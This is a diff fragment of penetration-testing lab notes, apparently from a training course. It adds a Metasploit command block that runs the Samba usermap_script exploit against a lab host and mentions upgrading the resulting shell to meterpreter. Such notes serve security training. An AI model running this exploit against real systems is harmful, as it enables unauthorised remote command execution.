@@ -2550,6 +2550,12 @@ check
 exploit
 ```
 
+```msfconsole
+use exploit/multi/samba/usermap_script
+set RHOSTS demo.ine.local
+exploit
+```
+
 > `check` command can be used to identify whether the system is vulnerable or not. This will give us a command shell session not a meterpreter session so we would have to go it our selves using `shell_to_meterperter` module.
 
 ```msfconsole
